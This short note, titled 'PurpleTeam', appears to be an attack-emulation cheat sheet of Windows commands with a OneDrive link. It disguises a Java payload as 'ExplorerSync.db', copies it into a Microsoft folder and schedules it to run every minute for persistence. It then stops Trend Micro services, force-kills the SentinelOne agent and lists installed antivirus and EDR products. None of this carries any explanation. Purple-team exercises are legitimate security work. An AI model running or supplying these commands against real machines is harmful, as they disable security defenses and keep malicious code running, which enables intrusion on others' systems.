# PurpleTeam

https://onedrive.live.com/view.aspx?resid=5EFC811CDEC9D7F0!6215&ithint=file%2Cdocx&authkey=!ACVO3y1Jyhq0mfY


copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db

schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f


Stop-Service -Name "ntrtscan"
Stop-Service -Name "tmlisten"


Stop-Process -Name SentinelAgent -Force


Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select displayName, pathToSignedProductExe, productState


Get-Service | Where-Object { $_.DisplayName -match "Sentinel|Defender|Trend|Crowd|Sophos|Symantec|Carbon|McAfee" } | Select DisplayName, Status
